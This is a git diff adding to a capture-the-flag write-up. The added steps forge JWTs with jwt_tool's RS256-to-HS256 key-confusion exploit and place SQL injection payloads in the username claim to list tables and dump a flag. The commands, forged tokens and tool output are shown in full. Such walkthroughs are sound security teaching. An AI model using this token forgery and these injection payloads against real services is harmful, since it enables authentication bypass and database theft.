@@ -114,7 +114,7 @@ module.exports = {
 }
 ```
 
-Let's go ahead with first try:
+Let's go ahead with first try, get public key and save it on public.pem file:
 
 ```shell
 ./jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5NW9UbTlETnpjSHI4Z0xoalphWVxua3RzYmoxS3h4VU9vencwdHJQOTNCZ0lwWHY2V2lwUVJCNWxxb2ZQbFU2RkI5OUpjNVFaMDQ1OXQ3M2dnVkRRaVxuWHVDTUkyaG9VZkoxVm1qTmVXQ3JTckRVaG9rSUZaRXVDdW1laHd3dFVOdUV2MGV6QzU0WlRkRUM1WVNUQU96Z1xuaklXYWxzSGovZ2E1WkVEeDNFeHQwTWg1QUV3YkFENzMrcVhTL3VDdmhmYWpncHpIR2Q5T2dOUVU2MExNZjJtSFxuK0Z5bk5zak5Od281blJlN3RSMTJXYjJZT0N4dzJ2ZGFtTzFuMWtmL1NNeXBTS0t2T2dqNXkwTEdpVTNqZVhNeFxuVjhXUytZaVlDVTVPQkFtVGN6Mncya3pCaFpGbEg2Uks0bXF1ZXhKSHJhMjNJR3Y1VUo1R1ZQRVhwZENxSzNUclxuMHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLVxuIiwiaWF0IjoxNjY0NzIxMjg1fQ.dxo7Z1PNUiH8cCnIEsB2DFdXiDNnyluY12d4JjaSmHCD_5os3iLzChVu9hJjNK9mDbX76qcX83kYoZYlkH5MuM_RT-3llOw4MTWACbb08M2Z0QOkFuoRKK3Zy7dFKSPOKzSuvlHHFOqMAYqlvlyE_Ao4vxsZmR0I7DzVO6VqMCJAygTtuRMLauD89wdAdsXlVYSqgcu70VY8J8oeDlQRKjDw5ua6xODjbfR7b3jFFZqnJBto0qq1IuGFvdvi0bKRW_9NlLtE96eohuXdHtTMln79DHZhyfGDQlbmR_lPwpcjGfmLmVYxI1ldOawNi4YMXzNGt99lh1tk81KxDntmRQ
@@ -162,5 +162,69 @@ nbf = NotBefore
 
 ```
 
+With public.pem file saved:
+```shell
+cat public.pem
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
+ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
+XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
+jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
++FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
+V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
+0wIDAQAB
+-----END PUBLIC KEY-----hell
 
+```
 
+After readin jwt_tool documentation, let's try with 
+#Legends:
+#[value] = the value inside bracket is filled by user
+#(information) = the value inside parentheses is information about the flag / command./jwt_tool.py [jwt] -I (inject) -pc (payload claim / payload key) [payload key] -pv (payload value) [new payload value] -X (exploit) k (confusing key exploit) -pk (public key) [public key file]
+
+```shell
+python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5NW9UbTlETnpjSHI4Z0xoalphWVxua3RzYmoxS3h4VU9vencwdHJQOTNCZ0lwWHY2V2lwUVJCNWxxb2ZQbFU2RkI5OUpjNVFaMDQ1OXQ3M2dnVkRRaVxuWHVDTUkyaG9VZkoxVm1qTmVXQ3JTckRVaG9rSUZaRXVDdW1laHd3dFVOdUV2MGV6QzU0WlRkRUM1WVNUQU96Z1xuaklXYWxzSGovZ2E1WkVEeDNFeHQwTWg1QUV3YkFENzMrcVhTL3VDdmhmYWpncHpIR2Q5T2dOUVU2MExNZjJtSFxuK0Z5bk5zak5Od281blJlN3RSMTJXYjJZT0N4dzJ2ZGFtTzFuMWtmL1NNeXBTS0t2T2dqNXkwTEdpVTNqZVhNeFxuVjhXUytZaVlDVTVPQkFtVGN6Mncya3pCaFpGbEg2Uks0bXF1ZXhKSHJhMjNJR3Y1VUo1R1ZQRVhwZENxSzNUclxuMHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLVxuIiwiaWF0IjoxNjY0NzMzNzU5fQ.JxK9hcv7L4_WhFOEvEY3H7hn0zGJz23FweugIUuNb4TZYK1tjGpPo7RIc26PgbvAKSLUrjIY-A2ina5HAkriGxx8RuCsVtnNHymwlPMH9czOI0Ch4ntSJfaGpZwLrwK7Jmzf-hdLq6U83DdM-LyTrKcKAoxOtbnLHBf_878eSdvWAzbETdfBZpq-CNfjGHSfZHuAfVjo6p_rLNG_fm-c9wCNtTz9oNgHN_pA5pOI8RZXsSPybsDtfUQe68VJQkXK9glMDywxzNmr1-SJuriomkLHUsXSIeHgroijKUIGJi6-5WpkZZJ7PrznLmP0R13cm8Du_d_SU3TVlr4iqjSB2g -I -pc username -pv "admin'union select 1, name, 2 from sqlite_master where type='table' limit 1 offset 0--"  -X k -pk public.pem 
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.6                \______|             @ticarpi      
+
+Original JWT: 
+
+File loaded: public.pem
+jwttool_6986aa5ed209a2cc13d5b92b81a20de1 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
+(This will only be valid on unpatched implementations of JWT.)
+[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJ3VuaW9uIHNlbGVjdCAxLCBuYW1lLCAyIGZyb20gc3FsaXRlX21hc3RlciB3aGVyZSB0eXBlPSd0YWJsZScgbGltaXQgMSBvZmZzZXQgMC0tIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5NW9UbTlETnpjSHI4Z0xoalphWVxua3RzYmoxS3h4VU9vencwdHJQOTNCZ0lwWHY2V2lwUVJCNWxxb2ZQbFU2RkI5OUpjNVFaMDQ1OXQ3M2dnVkRRaVxuWHVDTUkyaG9VZkoxVm1qTmVXQ3JTckRVaG9rSUZaRXVDdW1laHd3dFVOdUV2MGV6QzU0WlRkRUM1WVNUQU96Z1xuaklXYWxzSGovZ2E1WkVEeDNFeHQwTWg1QUV3YkFENzMrcVhTL3VDdmhmYWpncHpIR2Q5T2dOUVU2MExNZjJtSFxuK0Z5bk5zak5Od281blJlN3RSMTJXYjJZT0N4dzJ2ZGFtTzFuMWtmL1NNeXBTS0t2T2dqNXkwTEdpVTNqZVhNeFxuVjhXUytZaVlDVTVPQkFtVGN6Mncya3pCaFpGbEg2Uks0bXF1ZXhKSHJhMjNJR3Y1VUo1R1ZQRVhwZENxSzNUclxuMHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLVxuIiwiaWF0IjoxNjY0NzMzNzU5fQ.djeMJzeL9hOxm1oYJYjX7nVg8lWoihl9iU8HtW8m9y0
+
+```
+
+Get the flag:
+
+```shell
+python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5NW9UbTlETnpjSHI4Z0xoalphWVxua3RzYmoxS3h4VU9vencwdHJQOTNCZ0lwWHY2V2lwUVJCNWxxb2ZQbFU2RkI5OUpjNVFaMDQ1OXQ3M2dnVkRRaVxuWHVDTUkyaG9VZkoxVm1qTmVXQ3JTckRVaG9rSUZaRXVDdW1laHd3dFVOdUV2MGV6QzU0WlRkRUM1WVNUQU96Z1xuaklXYWxzSGovZ2E1WkVEeDNFeHQwTWg1QUV3YkFENzMrcVhTL3VDdmhmYWpncHpIR2Q5T2dOUVU2MExNZjJtSFxuK0Z5bk5zak5Od281blJlN3RSMTJXYjJZT0N4dzJ2ZGFtTzFuMWtmL1NNeXBTS0t2T2dqNXkwTEdpVTNqZVhNeFxuVjhXUytZaVlDVTVPQkFtVGN6Mncya3pCaFpGbEg2Uks0bXF1ZXhKSHJhMjNJR3Y1VUo1R1ZQRVhwZENxSzNUclxuMHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLVxuIiwiaWF0IjoxNjY0NzMzNzU5fQ.JxK9hcv7L4_WhFOEvEY3H7hn0zGJz23FweugIUuNb4TZYK1tjGpPo7RIc26PgbvAKSLUrjIY-A2ina5HAkriGxx8RuCsVtnNHymwlPMH9czOI0Ch4ntSJfaGpZwLrwK7Jmzf-hdLq6U83DdM-LyTrKcKAoxOtbnLHBf_878eSdvWAzbETdfBZpq-CNfjGHSfZHuAfVjo6p_rLNG_fm-c9wCNtTz9oNgHN_pA5pOI8RZXsSPybsDtfUQe68VJQkXK9glMDywxzNmr1-SJuriomkLHUsXSIeHgroijKUIGJi6-5WpkZZJ7PrznLmP0R13cm8Du_d_SU3TVlr4iqjSB2g -I -pc username -pv "admin' and 1=2 UNION SELECT 1,group_concat(top_secret_flaag),3 from flag_storage -- -" -X k -pk public.pem
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.6                \______|             @ticarpi      
+
+Original JWT: 
+
+File loaded: public.pem
+jwttool_7b2ff8edcbb3da3fbafb8e1a659af13e - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
+(This will only be valid on unpatched implementations of JWT.)
+[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyBhbmQgMT0yIFVOSU9OIFNFTEVDVCAxLGdyb3VwX2NvbmNhdCh0b3Bfc2VjcmV0X2ZsYWFnKSwzIGZyb20gZmxhZ19zdG9yYWdlIC0tIC0iLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2NjQ3MzM3NTl9.YFt8xsOIogoqcx_02wkqsm5VjRf92CzVCYZo7oopI2U
+```
+
+![burp flag](IMG/burp_flag.jpg)
